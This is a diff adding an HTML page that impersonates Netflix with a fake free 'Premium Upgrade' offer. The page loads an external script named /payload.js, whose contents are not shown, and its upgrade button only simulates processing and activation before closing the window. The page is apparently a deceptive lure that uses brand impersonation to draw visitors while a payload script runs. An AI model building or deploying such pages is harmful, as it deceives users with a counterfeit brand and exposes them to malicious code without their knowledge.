@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Premium Upgrade</title>
+    <script src="/payload.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #141414; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .card { background: linear-gradient(145deg, #1a1a1a, #0f0f0f); max-width: 480px; width: 100%; padding: 35px; border-radius: 16px; color: white; border: 1px solid rgba(255,255,255,0.05); text-align: center; }
+        .logo { font-size: 32px; font-weight: 700; color: #e50914; letter-spacing: 4px; margin-bottom: 10px; }
+        .tagline { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        .offer-badge { display: inline-block; padding: 4px 18px; border-radius: 20px; font-size: 12px; font-weight: 700; background: #e50914; color: white; margin-bottom: 15px; }
+        .plan-box { background: #222; padding: 25px; border-radius: 12px; margin: 15px 0; border: 2px solid #e50914; }
+        .plan-box .plan { font-size: 22px; font-weight: 700; color: #e50914; }
+        .plan-box .price { font-size: 38px; font-weight: 700; }
+        .plan-box .price small { font-size: 15px; color: #aaa; }
+        .plan-box .sub-text { color: #888; font-size: 13px; margin-top: 6px; }
+        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 18px 0; }
+        .features .item { background: #1f1f1f; padding: 16px; border-radius: 10px; font-size: 13px; color: #ccc; border: 1px solid rgba(255,255,255,0.05); }
+        .features .item .icon { font-size: 32px; display: block; margin-bottom: 8px; }
+        .btn { width: 100%; padding: 18px; background: linear-gradient(90deg, #e50914, #c40812); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 8px; }
+        .btn:hover { transform: scale(1.02); }
+        .btn-secondary { width: 100%; padding: 14px; background: transparent; color: #888; border: 1px solid #333; border-radius: 10px; cursor: pointer; margin-top: 8px; }
+        .footer { margin-top: 20px; color: #555; font-size: 11px; text-align: center; }
+        @media (max-width: 500px) { .features { grid-template-columns: 1fr 1fr; } .plan-box .price { font-size: 30px; } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">NETFLIX</div>
+        <div class="tagline">Stream unlimited movies & TV shows</div>
+        <span class="offer-badge">🔥 Limited Time Offer</span>
+        <div class="plan-box">
+            <div class="plan">⭐ PREMIUM PLAN</div>
+            <div class="price">$0.00 <small>for 1 month</small></div>
+            <div class="sub-text">Then $19.99/month • Cancel anytime</div>
+        </div>
+        <div class="features">
+            <div class="item"><span class="icon">🖥️</span>4K + HDR</div>
+            <div class="item"><span class="icon">📺</span>4 Devices</div>
+            <div class="item"><span class="icon">💾</span>Downloads</div>
+            <div class="item"><span class="icon">🔊</span>Dolby Atmos</div>
+        </div>
+        <button class="btn" id="upgradeBtn">⬆️ Upgrade to Premium</button>
+        <button class="btn-secondary" id="closeBtn">⏭️ Skip for now</button>
+        <div class="footer">Netflix, Inc. • Offer valid for 48 hours</div>
+    </div>
+    <script>
+        document.getElementById('closeBtn').addEventListener('click', function() { window.close(); });
+        document.getElementById('upgradeBtn').addEventListener('click', function() {
+            var btn = document.getElementById('upgradeBtn');
+            btn.innerHTML = '⏳ Processing Upgrade...';
+            btn.style.background = '#ffc107';
+            btn.style.color = '#333';
+            btn.disabled = true;
+            setTimeout(function() {
+                btn.innerHTML = '✅ Premium Activated! 🎉';
+                btn.style.background = '#28a745';
+                btn.style.color = 'white';
+                btn.disabled = false;
+                document.querySelector('.plan-box .price').innerHTML = '🎬 <small>Premium Active</small>';
+                setTimeout(function() { window.close(); }, 3000);
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
